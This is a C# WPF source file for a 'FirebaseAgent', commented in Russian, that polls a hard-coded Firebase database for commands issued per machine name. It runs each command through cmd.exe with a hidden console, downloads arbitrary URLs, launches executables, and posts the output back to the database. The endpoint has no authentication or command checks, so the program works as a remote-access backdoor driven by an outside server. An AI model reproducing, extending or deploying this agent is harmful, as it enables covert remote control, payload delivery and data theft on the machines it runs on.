using Firebase.Database;
using Firebase.Database.Query;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows;

namespace FirebaseAgent
{
    public partial class MainWindow : Window
    {
        private FirebaseClient firebase;
        private string machineName;
        private bool isRunning = true;
        private static readonly HttpClient http = new HttpClient();

        public MainWindow()
        {
            InitializeComponent();
            firebase = new FirebaseClient("https://test-qstem-default-rtdb.firebaseio.com/");
            machineName = Environment.MachineName.ToLower();
            Task.Run(ListenForCommands);
        }

        private async Task ListenForCommands()
        {
            while (isRunning)
            {
                try
                {
                    await firebase.Child("machines").Child(machineName).Child("lastSeen")
                        .PutAsync<string>(DateTime.UtcNow.ToString("o"));

                    var command = await firebase.Child("machines").Child(machineName)
                        .Child("cmd").OnceSingleAsync<string>();

                    if (!string.IsNullOrWhiteSpace(command))
                    {
                        string resultMessage;
                        try
                        {
                            var started = DateTime.UtcNow;
                            resultMessage = await ExecuteSmartCommand(command.Trim());
                            var took = DateTime.UtcNow - started;
                            resultMessage = $"[OK] Took: {took.TotalSeconds:F1}s\n{resultMessage}";
                        }
                        catch (Exception ex)
                        {
                            resultMessage = "[FAIL] " + ex.Message;
                        }

                        await firebase.Child("machines").Child(machineName)
                            .Child("result").PutAsync<string>(resultMessage);

                        // очищаем команду
                        await firebase.Child("machines").Child(machineName)
                            .Child("cmd").PutAsync<string>("");

                        Dispatcher.Invoke(() => Title = "Agent ждёт команду...");
                    }

                    await Task.Delay(2000);
                }
                catch (Exception ex)
                {
                    await firebase.Child("machines").Child(machineName)
                        .Child("result").PutAsync<string>("Ошибка: " + ex.Message);
                    await Task.Delay(5000);
                }
            }
        }

        private async Task<string> ExecuteSmartCommand(string command)
        {
            var wd = Path.GetTempPath(); // фиксируем рабочую папку
            // Быстрые команды-алиасы
            if (string.Equals(command, "explorer", StringComparison.OrdinalIgnoreCase))
            {
                Process.Start(new ProcessStartInfo("explorer.exe") { UseShellExecute = true });
                return "Проводник открыт.";
            }
            if (string.Equals(command, "notepad", StringComparison.OrdinalIgnoreCase))
            {
                Process.Start(new ProcessStartInfo("notepad.exe") { UseShellExecute = true });
                return "Блокнот открыт.";
            }

            if (command.StartsWith("open_chat", StringComparison.OrdinalIgnoreCase))
            {
                // open_chat [roomId]
                var parts = command.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries);
                var roomId = (parts.Length == 2 && !string.IsNullOrWhiteSpace(parts[1]))
                    ? parts[1].Trim()
                    : machineName; // по умолчанию — комната равна имени ПК

                Dispatcher.Invoke(() =>
                {
                    // если уже открыто — не создаём дубликат
                    foreach (Window w in Application.Current.Windows)
                        if (w is SharedChat.ChatWindow cw && cw.Title.Contains($"room: {roomId}"))
                        { w.Activate(); return; }

                    var cwNew = new SharedChat.ChatWindow(firebase, roomId, machineName);
                    cwNew.Show();
                });

                return $"Открыт чат room='{roomId}' на агенте.";
            }





            // Парсинг расширенных команд
            if (command.StartsWith("download ", StringComparison.OrdinalIgnoreCase))
            {
                // download <url> [dest]
                var tail = command.Substring(9).Trim();
                var parts = SplitArgs(tail);
                if (parts.Length < 1) throw new ArgumentException("Формат: download <url> [dest]");
                var url = parts[0];
                var dest = parts.Length >= 2 ? ExpandEnv(parts[1]) :
                           Path.Combine(wd, GetSafeFileNameFromUrl(url));

                var bytes = await DownloadFileAsync(url, dest);
                return $"Файл скачан: {dest}\nРазмер: {bytes:N0} байт\nWD: {wd}";
            }
           



            if (command.StartsWith("install ", StringComparison.OrdinalIgnoreCase))
            {
                // install <path> [args]
                var tail = command.Substring(8).Trim();
                var parts = SplitArgs(tail);
                if (parts.Length < 1) throw new ArgumentException("Формат: install <path> [args]");
                var exePath = ExpandEnv(parts[0]);
                var args = parts.Length >= 2 ? tail.Substring(parts[0].Length).Trim() : "";

                var (code, stdOut, stdErr) = RunProcess(exePath, args, wd);
                return $"Запуск: \"{exePath}\" {args}\nExitCode={code}\nWD: {wd}\n---OUT---\n{stdOut}\n---ERR---\n{stdErr}";
            }

            if (command.StartsWith("open_url ", StringComparison.OrdinalIgnoreCase))
            {
                var url = command.Substring(9).Trim();
                Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
                return $"Открыт URL: {url}";
            }

            if (command.StartsWith("run ", StringComparison.OrdinalIgnoreCase))
            {
                var raw = command.Substring(4);
                var (code, stdOut, stdErr) = RunProcess("cmd.exe", "/c " + raw, wd);
                return $"cmd /c {raw}\nExitCode={code}\nWD: {wd}\n---OUT---\n{stdOut}\n---ERR---\n{stdErr}";
            }

            // Fallback: всё, как раньше — отправили прямо в cmd
            {
                var (code, stdOut, stdErr) = RunProcess("cmd.exe", "/c " + command, wd);
                return $"cmd /c {command}\nExitCode={code}\nWD: {wd}\n---OUT---\n{stdOut}\n---ERR---\n{stdErr}";
            }
        }

        private static (int code, string stdout, string stderr) RunProcess(string file, string args, string workingDir)
        {
            var p = new Process();
            p.StartInfo.FileName = file;
            p.StartInfo.Arguments = args;
            p.StartInfo.WorkingDirectory = workingDir;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.Start();

            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit();
            return (p.ExitCode, output, error);
        }

        private static async Task<long> DownloadFileAsync(string url, string destPath)
        {
            var dir = Path.GetDirectoryName(destPath);
            if (!string.IsNullOrEmpty(dir))
                Directory.CreateDirectory(dir);

            using (var resp = await http.GetAsync(url, HttpCompletionOption.ResponseHeadersRead))
            {
                resp.EnsureSuccessStatusCode();
                using (var fs = new FileStream(destPath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    await resp.Content.CopyToAsync(fs);
                    return fs.Length;
                }
            }
        }


        private static string[] SplitArgs(string s)
        {
            var args = new List<string>();
            bool inQuotes = false;
            var current = new System.Text.StringBuilder();

            for (int i = 0; i < s.Length; i++)
            {
                char c = s[i];

                if (c == '"')
                {
                    // обработка \" внутри кавычек
                    if (inQuotes && i + 1 < s.Length && s[i + 1] == '"')
                    {
                        current.Append('"');
                        i++;
                    }
                    else
                    {
                        inQuotes = !inQuotes;
                    }
                }
                else if (char.IsWhiteSpace(c) && !inQuotes)
                {
                    if (current.Length > 0)
                    {
                        args.Add(current.ToString());
                        current.Clear();
                    }
                }
                else
                {
                    current.Append(c);
                }
            }

            if (current.Length > 0)
                args.Add(current.ToString());

            return args.ToArray();
        }


        private static string ExpandEnv(string s) =>
            Environment.ExpandEnvironmentVariables(s.Trim('"'));

        private static string GetSafeFileNameFromUrl(string url)
        {
            try
            {
                var name = Path.GetFileName(new Uri(url).AbsolutePath);
                return string.IsNullOrEmpty(name) ? "download.bin" : name;
            }
            catch { return "download.bin"; }
        }

        protected override void OnClosed(EventArgs e)
        {
            isRunning = false;
            base.OnClosed(e);
        }
    }
}
